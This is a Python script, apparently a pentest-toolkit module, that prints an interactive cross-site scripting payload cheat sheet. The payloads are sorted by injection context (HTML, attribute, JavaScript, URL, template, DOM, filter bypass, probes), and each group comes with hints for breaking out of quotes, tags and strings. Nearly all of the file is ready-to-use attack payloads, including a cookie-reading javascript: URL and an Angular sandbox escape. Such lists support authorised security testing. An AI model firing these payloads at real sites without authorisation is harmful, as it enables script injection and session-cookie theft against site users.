def run(data, cred, args):
    # --- CORE PALETTE ---
    G, C, B, Y, W, R = '\033[92m', '\033[96m', '\033[94m', '\033[93m', '\033[0m', '\033[91m'
    BOLD, DIM = '\033[1m', '\033[2m'

    # --- PAYLOAD DB ---
    PAYLOADS = {
    "html": [
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "<script>alert(1)</script>",
        "</p><img src=x onerror=alert(1)>",
        "<><img src=1 onerror=alert(1)>",
        "</script><script>alert(1)</script>"
    ],

    "attr": [
        "\"><img src=x onerror=alert(1)>",
        "'><img src=x onerror=alert(1)>",
        "\" onmouseover=alert(1) x=\"",
        "' onfocus=alert(1) autofocus '",
        "\" autofocus onfocus=alert(1) x=\"",
        "\"onmouseover=\"alert(1)",
        "onmouseover=alert(1)"
    ],

    "js": [
        "alert(1)",
        "';alert(1);//",
        "\";alert(1);//",
        "'-alert(1)-'",
        "';alert(1)",
        "';confirm(1);//",
        "\\\"-alert(1)}//",
        "\\\'-alert(1)//", 
        "</script><script>alert(1)</script>",
        "http://foo?&apos;-alert(1)-&apos;"

    ],

    "url": [
        "javascript:alert(1)",
        "javascript:print()",
        "javascript:alert(1)//",
        "javascript:alert(document.cookie)",
        "data:text/html,<script>alert(1)</script>"  
    ],

    "template": [
        "{{7*7}}",
        "{{$on.constructor('alert(1)')()}}",
        "${alert(1)}"

    ],

    "dom": [
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "\"><img src=x onerror=alert(1)>",
        "><svg onload=alert(1)>"
    ],

    "bypass": [
        "<svg/onload=alert(1)>",
        "<><img src=x onerror=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<math><mi//xlink:href=\"javascript:alert(1)\">"

    ],

    "probe": [
        "<test>",
        "\"",
        "'",
        "</script>",
        "-->",
        "${7*7}",
        "javascript:alert(1)"
    ]

}

    # --- HEADER ---
    print(f"\n{B}[*]{W} {BOLD}XSS INTERACTIVE HELPER{W}")

    while True:
        print(f"\n{C}── SELECT CONTEXT ─────────────────────────────────{W}")
        print("1. HTML (inside tags)")
        print("2. Attribute")
        print("3. JavaScript")
        print("4. URL / href")
        print("5. Template (Angular, etc)")
        print("6. DOM-based XSS")
        print("7. Filter bypass / restricted")
        print("8. Probes (find context)")
        print("9. Show all payloads")
        print("q. Quit")

        choice = input(f"\n{BOLD}> {W}").strip().lower()

        if choice == "q":
            break

        if choice == "9":
            print(f"\n{R}── ALL PAYLOADS ─────────────────────────────────{W}")
            for k, v in PAYLOADS.items():
                print(f"\n{Y}[{k.upper()}]{W}")
                for p in v:
                    print(f"{p}")
            continue

        mapping = {
            "1": "html",
            "2": "attr",
            "3": "js",
            "4": "url",
            "5": "template",
            "6": "dom",
            "7": "bypass",
            "8": "probe"
        }

        context = mapping.get(choice)

        if not context:
            continue

        print(f"\n{G}── {context.upper()} ───────────────────────────────{W}")

        for p in PAYLOADS[context]:
            print(f"{p}")

        # --- HINTS (this is important) ---
        print(f"\n{DIM}Hints:{W}")

        if context == "html":
            print("  - Try injecting tags like <img> or <svg>")
            print("  - If blocked, try breaking out with </tag>")

        elif context == "attr":
            print("  - Try breaking out of quotes (\" or ')")
            print("  - Use event handlers like onmouseover")

        elif context == "js":
            print("  - Break string with ' or \"")
            print("  - Use ; to inject code")

        elif context == "url":
            print("  - Try javascript: protocol")
            print("  - Useful in href/src attributes")

        elif context == "template":
            print("  - Test with {{7*7}} first")
            print("  - Then try Angular escape payload")

        elif context == "dom":
            print("  - Look for innerHTML, document.write")
            print("  - Inject HTML-based payloads")

        print("")